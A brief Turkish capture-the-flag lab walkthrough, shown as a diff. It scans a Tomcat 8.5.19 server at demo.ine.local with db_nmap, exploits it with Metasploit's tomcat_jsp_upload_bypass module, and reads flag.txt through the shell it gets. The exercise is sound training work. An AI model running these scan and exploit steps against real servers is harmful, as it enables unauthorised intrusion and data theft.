@@ -1,0 +1,18 @@
+1. Servis Tespiti
+msfconsole
+db_nmap -sV -sS -p 8080 demo.ine.local
+🧾 Sonuç:
+8080/tcp open  http    Apache Tomcat 8.5.19
+
+2. Exploit Modülünün Seçimi
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOSTS demo.ine.local
+run
+
+3. Shell Erişimi
+Exploit başarılı olduktan sonra elde edilen komut satırı üzerinden şu işlemler yapılır:
+
+cd /
+dir
+type flag.txt
+📁 flag.txt içeriği başarıyla alınmıştır.
